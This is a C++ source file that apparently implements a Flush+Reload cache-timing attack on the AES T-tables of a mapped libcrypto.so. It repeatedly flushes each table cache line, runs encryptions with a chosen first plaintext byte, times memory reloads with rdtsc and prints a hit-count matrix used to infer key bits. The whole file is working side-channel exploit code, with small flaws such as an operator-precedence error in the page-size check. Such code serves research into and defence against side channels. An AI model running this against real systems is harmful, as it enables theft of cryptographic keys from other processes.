#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "cacheutils.h"
#include <map>
#include <vector>
#include "encrypt.h"

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (205)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (10000)

unsigned int key[] =
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

size_t sum;
size_t scount;

std::map<char *, std::map<size_t, size_t>> timings;

char *base;
char *probe;
char *end;

int main()
{
    int fd = open("./libcrypto.so", O_RDONLY);
    size_t size = lseek(fd, 0, SEEK_END);
    if (size == 0)
        exit(-1);
    size_t map_size = size;
    if (map_size & 0xFFF != 0)
    {
        map_size |= 0xFFF;
        map_size += 1;
    }
    base = (char *)mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
    end = base + size;

    unsigned int plaintext[] =
        {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    unsigned int ciphertext[128];
    unsigned int restoredtext[128];
    unsigned int *taddress[4];

    uint64_t min_time = rdtsc();
    srand(min_time);
    sum = 0;
    for (size_t byte = 0; byte < 256; byte += 16)
    {
        plaintext[0] = byte;
        //plaintext[1] = byte;
        //plaintext[2] = byte;
        //plaintext[3] = byte;
        aesEncrypt(plaintext, ciphertext, key);
        tableAddress(taddress);
        // adjust me (decreasing order)
        char *te0 = taddress[0];
        char *te1 = taddress[1];
        char *te2 = taddress[2];
        char *te3 = taddress[3];

        //adjust address range to exclude unwanted lines/tables
        for (probe = te3; probe < te0 + 64 * 16; probe += 64) // hardcoded addresses (could be done dynamically)
        {
            size_t count = 0;
            for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
            {
                for (size_t j = 1; j < 16; ++j)
                    plaintext[j] = rand() % 256;
                flush(probe);
                aesEncrypt(plaintext, ciphertext, key);
                sched_yield();
                size_t time = rdtsc();
                maccess(probe);
                size_t delta = rdtsc() - time;
                if (delta < MIN_CACHE_MISS_CYCLES)
                    ++count;
            }
            sched_yield();
            timings[probe][byte] = count;
            sched_yield();
        }
    }

    for (auto ait : timings)
    {
        printf("%p", (void *)(ait.first - base));
        for (auto kit : ait.second)
        {
            printf(",%6lu", kit.second);
        }
        printf("\n");
    }

    close(fd);
    munmap(base, map_size);
    fflush(stdout);
    return 0;
}